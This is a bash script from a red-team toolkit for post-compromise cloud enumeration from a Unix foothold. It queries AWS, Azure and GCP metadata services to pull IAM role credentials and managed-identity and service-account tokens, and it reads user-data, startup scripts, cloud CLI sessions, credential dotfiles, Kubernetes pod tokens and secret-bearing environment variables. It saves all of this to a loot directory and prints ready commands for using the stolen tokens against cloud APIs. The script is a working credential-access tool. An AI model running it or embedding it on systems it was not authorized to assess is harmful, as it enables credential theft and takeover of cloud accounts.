#!/usr/bin/env bash
# EnumGod - Red Team Enumeration Toolkit   |   Author: Jeet Ramoliya
# ============================================================================
# rt-cloudenum.sh  -  Red Team CLOUD / hybrid recon from a *nix foothold.
#                     Same ranked findings model as the rest of the toolkit.
#
# WHAT IT DOES  (all READ-ONLY, all from THIS host's vantage point)
#   1. Instance Metadata Service (IMDS) on AWS / Azure / GCP:
#        - identify the provider & instance
#        - pull the attached IAM role / managed identity / service-account TOKEN
#          (the classic SSRF-equivalent local creds grab)
#        - read user-data / custom-data (frequently contains secrets)
#   2. Local CLI credential reuse: aws / az / gcloud / kubectl already logged in
#   3. Kubernetes service-account token & RBAC (kubectl auth can-i)
#   4. Cloud secrets in environment variables & dotfiles
#
# USAGE
#   ./rt-cloudenum.sh                 # autodetect provider, grab what's reachable
#   ./rt-cloudenum.sh -o /dev/shm -j  # choose outdir, write findings.json
#   ./rt-cloudenum.sh --no-token      # identify only; do NOT fetch creds/tokens
#
# NOTE  Fetching an IMDS role token is a credential-access action. Only run on
#       hosts you are authorized to assess. Tokens are written to the loot dir.
# ============================================================================
set -u

OUTBASE="."; JSON=0; NOTOKEN=0
while [ $# -gt 0 ]; do
  case "$1" in
    -o) OUTBASE="$2"; shift 2;;
    -j|--json) JSON=1; shift;;
    --no-token) NOTOKEN=1; shift;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
    *) echo "unknown arg: $1"; exit 1;;
  esac
done

HOST=$(hostname 2>/dev/null || echo host); TS=$(date +%Y%m%d_%H%M%S)
RUN="${OUTBASE%/}/cloudenum_${HOST}_${TS}"; mkdir -p "$RUN" 2>/dev/null || { echo "[-] cannot create $RUN"; exit 1; }
if [ -t 1 ]; then R=$'\e[31m'; Y=$'\e[33m'; C=$'\e[36m'; G=$'\e[32m'; D=$'\e[90m'; N=$'\e[0m'; else R=; Y=; C=; G=; D=; N=; fi
SUMMARY="$RUN/00_SUMMARY.txt"; NEXT="$RUN/NEXT_STEPS.txt"; JFILE="$RUN/findings.json"
: > "$SUMMARY"; : > "$NEXT"; HIGHN=0; MEDN=0; INFON=0
declare -a J_HIGH=() J_MED=() J_INFO=() J_NEXT=()
sect(){ printf '\n%s[==== %s ====]%s\n' "$C" "$1" "$N"; }
flag(){ sev="$1"; shift; txt="$*"; case "$sev" in
    HIGH) col=$R;tag="[HIGH]";HIGHN=$((HIGHN+1));J_HIGH+=("$txt");;
    MED)  col=$Y;tag="[MED ]";MEDN=$((MEDN+1));J_MED+=("$txt");;
    *)    col=$D;tag="[INFO]";INFON=$((INFON+1));J_INFO+=("$txt");; esac
  printf '%s%s %s%s\n' "$col" "$tag" "$txt" "$N"; printf '%s %s\n' "$tag" "$txt" >> "$SUMMARY"; }
nextstep(){ printf '[*] %s\n    %s\n\n' "$1" "$2" >> "$NEXT"; J_NEXT+=("$1 :: $2"); }
save(){ cat > "$RUN/$1"; }
has(){ command -v "$1" >/dev/null 2>&1; }
# fast http getter (curl or wget), 3s timeout; args: URL [header ...]
GET(){ url="$1"; shift; hdrs=""; for h in "$@"; do hdrs="$hdrs -H \"$h\""; done
  if has curl; then eval "curl -s --max-time 3 $hdrs '$url'" 2>/dev/null
  elif has wget; then wh=""; for h in "$@"; do wh="$wh --header=\"$h\""; done; eval "wget -q -T 3 -O - $wh '$url'" 2>/dev/null; fi; }

IMDS=169.254.169.254
enumgod_banner(){
  printf '%s' "${C:-}"
  cat <<'ART'
 _____                        ____           _
| ____|_ __  _   _ _ __ ___  / ___| ___   __| |
|  _| | '_ \| | | | '_ ` _ \| |  _ / _ \ / _` |
| |___| | | | |_| | | | | | | |_| | (_) | (_| |
|_____|_| |_|\__,_|_| |_| |_|\____|\___/ \__,_|
ART
  printf '%s   EnumGod  Red Team Enumeration Toolkit%s\n' "${G:-}" "${N:-}"
  printf '%s   author : Jeet Ramoliya   module : %s%s\n\n' "${D:-}" "$1" "${N:-}"
}
enumgod_banner "cloud / IMDS"
echo "${G}[*] rt-cloudenum  ->  $RUN${N}"
echo "${D}[*] $(date)  host=$HOST  no-token=$NOTOKEN${N}"

PROVIDER="unknown"

# ----------------------------- AWS -----------------------------
sect "AWS IMDS"
# IMDSv2 token first, fall back to v1
AWS_TOK=$(has curl && curl -s --max-time 3 -X PUT "http://$IMDS/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 120" 2>/dev/null)
AWS_H=(); [ -n "$AWS_TOK" ] && AWS_H=("X-aws-ec2-metadata-token: $AWS_TOK")
AWS_ID=$(GET "http://$IMDS/latest/meta-data/instance-id" "${AWS_H[@]}")
if [ -n "$AWS_ID" ]; then
  PROVIDER="aws"; flag INFO "AWS instance reachable via IMDS (instance-id: $AWS_ID)."
  {
    echo "instance-id: $AWS_ID"
    echo "ami-id: $(GET "http://$IMDS/latest/meta-data/ami-id" "${AWS_H[@]}")"
    echo "region: $(GET "http://$IMDS/latest/meta-data/placement/region" "${AWS_H[@]}")"
    echo "iam-info: $(GET "http://$IMDS/latest/meta-data/iam/info" "${AWS_H[@]}")"
  } | save 01_aws_meta.txt
  [ -z "$AWS_TOK" ] && flag MED "AWS IMDSv1 is enabled (no token required) -> SSRF on this host = instant creds."
  ROLE=$(GET "http://$IMDS/latest/meta-data/iam/security-credentials/" "${AWS_H[@]}")
  if [ -n "$ROLE" ]; then
    flag HIGH "Attached IAM role via IMDS: $ROLE"
    if [ "$NOTOKEN" = "0" ]; then
      GET "http://$IMDS/latest/meta-data/iam/security-credentials/$ROLE" "${AWS_H[@]}" | save 01_aws_role_creds.json
      grep -q 'SecretAccessKey' "$RUN/01_aws_role_creds.json" 2>/dev/null && {
        flag HIGH "Retrieved temporary AWS role credentials (AccessKey/Secret/Token) -> 01_aws_role_creds.json."
        nextstep "Use AWS role creds" "export AWS_ACCESS_KEY_ID=..; export AWS_SECRET_ACCESS_KEY=..; export AWS_SESSION_TOKEN=..; aws sts get-caller-identity"
      }
    fi
  fi
  # user-data often holds bootstrap secrets
  UD=$(GET "http://$IMDS/latest/user-data" "${AWS_H[@]}")
  if [ -n "$UD" ]; then echo "$UD" | save 01_aws_userdata.txt
    echo "$UD" | grep -Eqi 'password|secret|token|api[_-]?key|AKIA' && flag HIGH "AWS user-data contains secret-shaped values -> 01_aws_userdata.txt."
  fi
else
  echo "no AWS IMDS" | save 01_aws_meta.txt
fi

# ----------------------------- Azure -----------------------------
sect "Azure IMDS / Managed Identity"
AZ_META=$(GET "http://$IMDS/metadata/instance?api-version=2021-02-01" "Metadata: true")
if echo "$AZ_META" | grep -qi 'azEnvironment\|subscriptionId\|vmId'; then
  PROVIDER="azure"; flag INFO "Azure instance reachable via IMDS."
  echo "$AZ_META" | save 02_azure_meta.txt
  SUB=$(echo "$AZ_META" | grep -oE '"subscriptionId":"[^"]+"' | head -1)
  [ -n "$SUB" ] && flag INFO "Azure $SUB"
  # managed identity token for ARM
  if [ "$NOTOKEN" = "0" ]; then
    MIT=$(GET "http://$IMDS/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" "Metadata: true")
    if echo "$MIT" | grep -q 'access_token'; then
      echo "$MIT" | save 02_azure_mi_token.json
      flag HIGH "Retrieved Azure Managed Identity token for ARM -> 02_azure_mi_token.json."
      nextstep "Use Azure MI token (ARM)" "TOKEN=\$(jq -r .access_token 02_azure_mi_token.json); curl -s -H \"Authorization: Bearer \$TOKEN\" https://management.azure.com/subscriptions?api-version=2020-01-01"
      # also grab a Graph token (Entra enumeration)
      GT=$(GET "http://$IMDS/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" "Metadata: true")
      echo "$GT" | grep -q 'access_token' && { echo "$GT" | save 02_azure_mi_graph.json; flag HIGH "Also retrieved a Microsoft Graph token (Entra ID enumeration) -> 02_azure_mi_graph.json."; nextstep "Entra via Graph token" "TOKEN=\$(jq -r .access_token 02_azure_mi_graph.json); curl -s -H \"Authorization: Bearer \$TOKEN\" https://graph.microsoft.com/v1.0/me"; }
    fi
  fi
else
  echo "no Azure IMDS" | save 02_azure_meta.txt
fi

# ----------------------------- GCP -----------------------------
sect "GCP metadata / service account"
GCP_PROJ=$(GET "http://metadata.google.internal/computeMetadata/v1/project/project-id" "Metadata-Flavor: Google")
if [ -n "$GCP_PROJ" ]; then
  PROVIDER="gcp"; flag INFO "GCP instance reachable (project: $GCP_PROJ)."
  {
    echo "project: $GCP_PROJ"
    echo "sa-email: $(GET "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" "Metadata-Flavor: Google")"
    echo "scopes:"; GET "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" "Metadata-Flavor: Google"
  } | save 03_gcp_meta.txt
  SCOPES=$(GET "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" "Metadata-Flavor: Google")
  echo "$SCOPES" | grep -q 'cloud-platform' && flag HIGH "GCP service account has cloud-platform scope (full API access)."
  if [ "$NOTOKEN" = "0" ]; then
    GTOK=$(GET "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" "Metadata-Flavor: Google")
    echo "$GTOK" | grep -q 'access_token' && { echo "$GTOK" | save 03_gcp_token.json; flag HIGH "Retrieved GCP service-account access token -> 03_gcp_token.json."; nextstep "Use GCP SA token" "TOKEN=\$(jq -r .access_token 03_gcp_token.json); curl -s -H \"Authorization: Bearer \$TOKEN\" https://cloudresourcemanager.googleapis.com/v1/projects"; }
  fi
  # project-wide SSH keys / startup scripts
  GET "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script" "Metadata-Flavor: Google" | save 03_gcp_startup.txt
else
  echo "no GCP metadata" | save 03_gcp_meta.txt
fi

[ "$PROVIDER" = "unknown" ] && flag INFO "No cloud IMDS reachable - this host may be on-prem or IMDS is blocked."

# ----------------------------- local CLI reuse -----------------------------
sect "Local cloud CLI sessions (credential reuse)"
{
  if has aws; then echo "== aws sts get-caller-identity =="; aws sts get-caller-identity 2>&1; fi
  if has az;  then echo; echo "== az account show =="; az account show 2>&1 | head -40; fi
  if has gcloud; then echo; echo "== gcloud auth list =="; gcloud auth list 2>&1; echo "== gcloud config =="; gcloud config list 2>&1; fi
} | save 04_cli_sessions.txt
if has aws && aws sts get-caller-identity >/dev/null 2>&1; then flag HIGH "aws CLI is already authenticated -> reuse: aws sts get-caller-identity (see 04_cli_sessions.txt)."; nextstep "Enumerate AWS as current CLI identity" "aws iam get-account-authorization-details 2>/dev/null; aws s3 ls; (consider pmapper / ScoutSuite / enumerate-iam)"; fi
if has az && az account show >/dev/null 2>&1; then flag HIGH "az CLI is already authenticated -> reuse the session."; nextstep "Enumerate Entra/Azure as current az identity" "az ad user list --query '[].userPrincipalName' -o tsv; az role assignment list --all"; fi
if has gcloud && gcloud auth list 2>/dev/null | grep -q '\*'; then flag HIGH "gcloud is authenticated -> reuse the active account."; nextstep "Enumerate GCP as current gcloud identity" "gcloud projects list; gcloud auth print-access-token"; fi
# dotfile credentials
for f in ~/.aws/credentials ~/.azure/accessTokens.json ~/.azure/msal_token_cache.json ~/.config/gcloud/credentials.db ~/.config/gcloud/legacy_credentials; do
  [ -e "$f" ] && flag HIGH "Cloud credential file on disk: $f"
done

# ----------------------------- kubernetes -----------------------------
sect "Kubernetes"
SA=/var/run/secrets/kubernetes.io/serviceaccount
if [ -d "$SA" ]; then
  flag HIGH "In-pod Kubernetes service-account token present ($SA/token)."
  { echo "namespace: $(cat $SA/namespace 2>/dev/null)"; echo "token-bytes: $(wc -c < $SA/token 2>/dev/null)"; } | save 05_k8s.txt
  nextstep "Use pod SA token" "T=\$(cat $SA/token); APISERVER=https://\$KUBERNETES_SERVICE_HOST:\$KUBERNETES_SERVICE_PORT; curl -sk -H \"Authorization: Bearer \$T\" \$APISERVER/api/v1/namespaces/\$(cat $SA/namespace)/pods"
  if has kubectl; then
    echo "== auth can-i --list ==" >> "$RUN/05_k8s.txt"; kubectl auth can-i --list 2>/dev/null >> "$RUN/05_k8s.txt"
    kubectl auth can-i create pods >/dev/null 2>&1 && flag HIGH "Can create pods -> mount host FS / privileged pod -> node root."
    kubectl auth can-i get secrets >/dev/null 2>&1 && flag HIGH "Can read Kubernetes secrets -> harvest cluster credentials."
  fi
elif [ -n "${KUBECONFIG:-}" ] || [ -f ~/.kube/config ]; then
  flag MED "kubeconfig present -> cluster access configured (kubectl get nodes)."
fi

# ----------------------------- env secrets -----------------------------
sect "Environment variable secrets"
env 2>/dev/null | grep -Ei 'AWS_|AZURE_|GOOGLE_|GCP_|ARM_|_TOKEN|_SECRET|_KEY|PASSWORD|CLIENT_SECRET' | save 06_env.txt
[ -s "$RUN/06_env.txt" ] && flag MED "Cloud/secret-shaped environment variables set (see 06_env.txt)."

# ----------------------------- summary -----------------------------
sect "Writing ranked summary"
{
  echo "rt-cloudenum summary - $HOST - $(date)"
  echo "Provider: $PROVIDER"
  echo
  echo "### HIGH ($HIGHN) ###"; printf '%s\n' "${J_HIGH[@]:-}"
  echo; echo "### MED ($MEDN) ###"; printf '%s\n' "${J_MED[@]:-}"
  echo; echo "### INFO ($INFON) ###"; printf '%s\n' "${J_INFO[@]:-}"
  echo; echo "=== RECOMMENDED NEXT MOVE ==="
  if [ -s "$NEXT" ]; then head -2 "$NEXT" | sed 's/^\[\*\] /-> /'; else echo "-> No cloud creds reachable from here. Check SSRF in hosted apps to reach IMDS."; fi
} > "$SUMMARY"

if [ "$JSON" = "1" ]; then
  jarr(){ printf '['; first=1; shift; for e in "$@"; do [ $first -eq 1 ]||printf ','; first=0; printf '%s' "$e" | sed 's/\\/\\\\/g;s/"/\\"/g' | awk '{printf "\"%s\"",$0}'; done; printf ']'; }
  { printf '{\n  "host":"%s","provider":"%s","ts":"%s",\n' "$HOST" "$PROVIDER" "$TS"
    printf '  "high":'; jarr x "${J_HIGH[@]:-}"; printf ',\n  "med":'; jarr x "${J_MED[@]:-}"; printf ',\n  "info":'; jarr x "${J_INFO[@]:-}"; printf ',\n  "next_steps":'; jarr x "${J_NEXT[@]:-}"; printf '\n}\n'; } > "$JFILE"
fi

echo; echo "${G}[+] Done. HIGH=$HIGHN MED=$MEDN INFO=$INFON${N}"
echo "${Y}[!] Credential material may be in $RUN - handle per rules of engagement.${N}"
echo "${G}[+] Read: $SUMMARY${N}"
